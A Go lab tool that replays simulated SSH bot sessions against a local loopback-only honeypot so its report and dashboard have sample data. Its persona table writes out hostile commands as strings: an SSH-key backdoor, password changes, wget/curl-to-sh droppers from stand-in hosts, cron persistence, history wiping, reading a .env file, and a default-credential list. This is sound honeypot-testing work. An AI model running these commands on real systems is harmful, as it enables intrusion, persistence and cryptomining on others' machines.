// Command lab fills a local honeypot with scripted bot traffic, so the
// report and dashboard have something to show before the honeypot has met
// the internet:
//
//	./bin/honeypot -addr 127.0.0.1:2222 -data /tmp/lab -accept-after 2 &
//	go run ./tools/lab -addr 127.0.0.1:2222 -sessions 400
//	./bin/honeypot dashboard -data /tmp/lab
//
// The behaviours are modelled on SSH bots that honeypot operators commonly
// report (key planters, recon one-liners, Mirai-style busybox probes, miner
// droppers, scanners that give up). Each simulated bot connects from its own
// loopback address (127.0.x.y), so the source-IP tables have something to
// rank. It is lab data and the README says so.
//
// The target must be a loopback address: this drives logins and dropper
// commands, and it has no business talking to anyone else's machine.
package main

import (
	"crypto/ed25519"
	"flag"
	"fmt"
	"io"
	"math/rand/v2"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

type persona struct {
	name   string
	weight int
	client string
	// lines run as exec requests, one channel each, unless pty is set, in
	// which case they are typed into one interactive shell.
	lines   func(r *rand.Rand) []string
	pty     bool
	giveUp  bool // tries one password, fails, leaves
	silent  bool // logs in and runs nothing
	withKey bool // offers a public key before the password
}

var (
	creds = [][2]string{
		{"root", "123456"}, {"root", "admin"}, {"root", "root"}, {"root", "password"},
		{"root", "1qaz2wsx"}, {"root", "P@ssw0rd"}, {"admin", "admin"}, {"ubuntu", "ubuntu"},
		{"pi", "raspberry"}, {"test", "test"}, {"user", "user"}, {"oracle", "oracle"},
		{"postgres", "postgres"}, {"root", "toor"}, {"root", "qwerty"}, {"git", "git"},
		{"root", "12345678"}, {"deploy", "deploy"}, {"root", "Huawei@123"}, {"support", "support"},
	}
	hosts  = []string{"192.0.2.10", "192.0.2.77", "198.51.100.7", "198.51.100.23", "203.0.113.9", "203.0.113.54", "dl.example.net", "cdn.example.org"}
	arches = []string{"x86_64", "x86", "arm7", "mips", "mpsl"}
)

func pick[T any](r *rand.Rand, xs []T) T { return xs[r.IntN(len(xs))] }

var personas = []persona{
	{name: "key planter", weight: 30, client: "SSH-2.0-libssh2_1.10.0", withKey: true, lines: func(r *rand.Rand) []string {
		return []string{
			`cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfakekeyfakekeyfakekey mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`,
			`uname -a; cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'; free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`,
		}
	}},
	{name: "recon", weight: 24, client: "SSH-2.0-Go", lines: func(r *rand.Rand) []string {
		return []string{
			"uname -s -v -n -r -m",
			"cat /proc/cpuinfo | grep model | grep name | wc -l",
			"lscpu | grep Model",
			"free -m | grep Mem | awk '{print $2}'",
			"ls -lh $(which ls)",
			"crontab -l",
			"w",
		}
	}},
	{name: "password changer", weight: 10, client: "SSH-2.0-Go", lines: func(r *rand.Rand) []string {
		return []string{fmt.Sprintf(`echo "root:%s"|chpasswd|bash`, randWord(r, 10))}
	}},
	{name: "mirai-style", weight: 14, client: "SSH-2.0-libssh_0.9.6", pty: true, lines: func(r *rand.Rand) []string {
		h := pick(r, hosts)
		return []string{
			"enable", "system", "shell", "sh",
			"cat /proc/mounts; /bin/busybox ECCHI",
			fmt.Sprintf("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://%s/bins.sh; chmod 777 bins.sh; sh bins.sh; rm -rf bins.sh", h),
		}
	}},
	{name: "miner dropper", weight: 12, client: "SSH-2.0-Go", lines: func(r *rand.Rand) []string {
		h := pick(r, hosts)
		return []string{
			"nproc; cat /proc/cpuinfo | grep -c processor",
			"pkill -9 -f xmrig; killall -9 kdevtmpfsi 2>/dev/null; echo done",
			fmt.Sprintf("cd /tmp && wget -q http://%s/%s -O .x && chmod +x .x && ./.x -o pool.example.net:3333", h, pick(r, arches)),
			fmt.Sprintf(`(crontab -l 2>/dev/null; echo "*/10 * * * * curl -fsSL http://%s/c.sh | sh") | crontab -`, h),
			"history -c; rm -rf ~/.bash_history",
		}
	}},
	{name: "curl | sh", weight: 8, client: "SSH-2.0-Go", lines: func(r *rand.Rand) []string {
		return []string{fmt.Sprintf("curl -s http://%s/%s.sh | sh", pick(r, hosts), randWord(r, 4))}
	}},
	{name: "probe", weight: 14, client: "SSH-2.0-Go", lines: func(r *rand.Rand) []string {
		return []string{pick(r, []string{"uname -a", "id", "echo 1", "cat /etc/issue", "ifconfig"})}
	}},
	{name: "hands-on", weight: 4, client: "SSH-2.0-OpenSSH_8.4p1", pty: true, lines: func(r *rand.Rand) []string {
		return []string{"id", "ls -la", "cat /etc/passwd | grep bash", "ls /srv/bakery", "cat /srv/bakery/.env", "ps aux | grep node", "last | head -n 5", "exit"}
	}},
	{name: "silent", weight: 6, client: "SSH-2.0-Go", silent: true},
	{name: "scanner", weight: 20, client: "SSH-2.0-libssh_0.9.6", giveUp: true},
}

func randWord(r *rand.Rand, n int) string {
	const a = "abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = a[r.IntN(len(a))]
	}
	return string(b)
}

type bot struct {
	ip   net.IP
	p    persona
	cred [2]string
	key  ssh.Signer
}

func main() {
	addr := flag.String("addr", "127.0.0.1:2222", "honeypot address (loopback only)")
	sessions := flag.Int("sessions", 400, "connections to make")
	nbots := flag.Int("bots", 60, "distinct simulated bots (source addresses)")
	parallel := flag.Int("parallel", 8, "connections at once")
	seed := flag.Uint64("seed", 1, "random seed, for a repeatable run")
	flag.Parse()

	host, _, err := net.SplitHostPort(*addr)
	if err != nil || !net.ParseIP(host).IsLoopback() {
		fmt.Fprintf(os.Stderr, "lab: refusing %q: only a honeypot on this machine\n", *addr)
		os.Exit(1)
	}

	r := rand.New(rand.NewPCG(*seed, 99))
	total := 0
	for _, p := range personas {
		total += p.weight
	}
	bots := make([]bot, *nbots)
	for i := range bots {
		n := r.IntN(total)
		var p persona
		for _, q := range personas {
			if n < q.weight {
				p = q
				break
			}
			n -= q.weight
		}
		seedBytes := make([]byte, ed25519.SeedSize)
		for k := range seedBytes {
			seedBytes[k] = byte(r.IntN(256))
		}
		signer, _ := ssh.NewSignerFromKey(ed25519.NewKeyFromSeed(seedBytes))
		bots[i] = bot{
			ip:   net.IPv4(127, byte(1+r.IntN(250)), byte(r.IntN(256)), byte(1+r.IntN(250))),
			p:    p,
			cred: pick(r, creds),
			key:  signer,
		}
	}

	// A few loud bots come back again and again, the rest now and then.
	order := make([]int, *sessions)
	for i := range order {
		if r.IntN(3) == 0 {
			order[i] = r.IntN(min(6, len(bots)))
		} else {
			order[i] = r.IntN(len(bots))
		}
	}
	lines := make([][]string, len(order))
	for i, b := range order {
		if bots[b].p.lines != nil {
			lines[i] = bots[b].p.lines(r)
		}
	}

	sem := make(chan struct{}, max(1, *parallel))
	var wg sync.WaitGroup
	var mu sync.Mutex
	ok, failed := 0, 0
	for i, b := range order {
		wg.Add(1)
		sem <- struct{}{}
		go func(b bot, cmds []string) {
			defer wg.Done()
			defer func() { <-sem }()
			err := visit(*addr, b, cmds)
			mu.Lock()
			if err == nil {
				ok++
			} else {
				failed++
			}
			mu.Unlock()
		}(bots[b], lines[i])
	}
	wg.Wait()
	fmt.Printf("lab: %d sessions (%d logged in, %d gave up) from %d simulated bots\n", len(order), ok, failed, len(bots))
}

func visit(addr string, b bot, cmds []string) error {
	// The first password comes from the bot's own list entry; retries walk
	// on through the list from a per-bot starting point.
	attempt := 0
	start := int(b.ip[13]) + int(b.ip[14]) + int(b.ip[15])
	passwords := func() (string, error) {
		attempt++
		if attempt == 1 {
			return b.cred[1], nil
		}
		return creds[(start+attempt)%len(creds)][1], nil
	}
	tries := 3
	if b.p.giveUp {
		tries = 1
	}
	auth := []ssh.AuthMethod{ssh.RetryableAuthMethod(ssh.PasswordCallback(passwords), tries)}
	if b.p.withKey {
		auth = append([]ssh.AuthMethod{ssh.PublicKeys(b.key)}, auth...)
	}
	d := net.Dialer{LocalAddr: &net.TCPAddr{IP: b.ip}, Timeout: 10 * time.Second}
	conn, err := d.Dial("tcp", addr)
	if err != nil {
		return err
	}
	c, chans, reqs, err := ssh.NewClientConn(conn, addr, &ssh.ClientConfig{
		User: b.cred[0], Auth: auth, ClientVersion: b.p.client,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(), // a local honeypot
		Timeout:         10 * time.Second,
	})
	if err != nil {
		conn.Close()
		return err
	}
	client := ssh.NewClient(c, chans, reqs)
	defer client.Close()
	if b.p.silent {
		time.Sleep(time.Duration(200+rand.IntN(800)) * time.Millisecond)
		return nil
	}
	if b.p.pty {
		return typeInto(client, cmds)
	}
	for _, cmd := range cmds {
		s, err := client.NewSession()
		if err != nil {
			return err
		}
		_ = s.Run(cmd)
		s.Close()
		time.Sleep(time.Duration(50+rand.IntN(400)) * time.Millisecond)
	}
	return nil
}

func typeInto(client *ssh.Client, cmds []string) error {
	s, err := client.NewSession()
	if err != nil {
		return err
	}
	defer s.Close()
	if err := s.RequestPty("xterm", 24, 80, ssh.TerminalModes{}); err != nil {
		return err
	}
	in, _ := s.StdinPipe()
	s.Stdout = io.Discard
	if err := s.Shell(); err != nil {
		return err
	}
	for _, cmd := range cmds {
		time.Sleep(time.Duration(300+rand.IntN(1500)) * time.Millisecond)
		_, _ = io.WriteString(in, cmd+"\r")
	}
	if !strings.EqualFold(cmds[len(cmds)-1], "exit") {
		time.Sleep(time.Second)
		_, _ = io.WriteString(in, "exit\r")
	}
	done := make(chan struct{})
	go func() { _ = s.Wait(); close(done) }()
	select {
	case <-done:
	case <-time.After(15 * time.Second):
	}
	return nil
}
